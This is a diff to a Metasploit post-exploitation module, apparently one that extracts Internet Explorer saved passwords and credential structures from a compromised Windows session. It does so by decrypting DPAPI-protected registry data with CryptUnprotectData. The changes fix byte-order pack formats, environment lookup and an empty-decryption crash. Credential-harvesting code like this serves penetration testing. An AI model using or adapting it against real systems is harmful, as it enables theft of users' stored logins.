@@ -1,14 +1,10 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
-require 'msf/core/post/file'
-require 'msf/core/post/windows/registry'
 
 class Metasploit3 < Msf::Post
 
@@ -45,7 +41,7 @@ class Metasploit3 < Msf::Post
     if is_86
       addr = [data].pack("V")
     else
-      addr = [data].pack("Q")
+      addr = [data].pack("Q<")
     end
     return addr
   end
@@ -89,7 +85,7 @@ class Metasploit3 < Msf::Post
     entropy.each_byte do |c|
       salt << c
     end
-    ent = salt.pack("s*")
+    ent = salt.pack("v*")
 
     #save values to memory and pack addresses
     mem = mem_write(data, 1024)
@@ -122,7 +118,7 @@ class Metasploit3 < Msf::Post
     guid.each_byte do |c|
       salt << c*4
     end
-    ent = salt.pack("s*")
+    ent = salt.pack("v*")
 
     #write entropy to memory and pack addresses
     mem = mem_write(ent,1024)
@@ -137,7 +133,7 @@ class Metasploit3 < Msf::Post
       len,add = ret["pDataOut"].unpack("V2")
     else
       ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
-      len,add = ret["pDataOut"].unpack("Q2")
+      len,add = ret["pDataOut"].unpack("Q<2")
     end
 
     #get data, and return it
@@ -261,7 +257,7 @@ class Metasploit3 < Msf::Post
     xp_c = "\\Cookies\\index.dat"
     h_paths = []
     c_paths = []
-    base = session.fs.file.expand_path("%USERPROFILE%")
+    base = session.sys.config.getenv('USERPROFILE')
     if host['OS'] =~ /(Windows 7|2008|Vista)/
       h_paths << base + vist_h
       h_paths << base + vist_hlow
@@ -323,8 +319,15 @@ class Metasploit3 < Msf::Post
         if val_arr.include?(hash)
           data = registry_getvaldata(regpath, hash)
           dec = decrypt_reg(url, data)
+
+          # If CryptUnprotectData fails, decrypt_reg() will return "", and unpack() will end up
+          # returning an array of nils. If this happens, we can cause an "undefined method
+          # `+' for NilClass." when we try to calculate the offset, and this causes the module to die.
+          next if dec.empty?
+
           #decode data and add to creds array
           header = dec.unpack("VVVVVV")
+
           offset = header[0] + header[1] #offset to start of data
           cnt = header[5]/2 # of username/password combinations
           secrets = dec[offset,dec.length-(offset + 1)].split("\x00\x00")
@@ -353,13 +356,13 @@ class Metasploit3 < Msf::Post
     #read array of addresses as pointers to each structure
     raw = read_str(p_to_arr[0], arr_len,2)
     pcred_array = raw.unpack("V*") if is_86
-    pcred_array = raw.unpack("Q*") unless is_86
+    pcred_array = raw.unpack("Q<*") unless is_86
 
     #loop through the addresses and read each credential structure
     pcred_array.each do |pcred|
       raw = read_str(pcred, 52,2)
-      cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
-      cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86
+      cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
+      cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
 
       location = read_str(cred_struct[2],512, 1)
       if location.include? "Microsoft_WinInet"
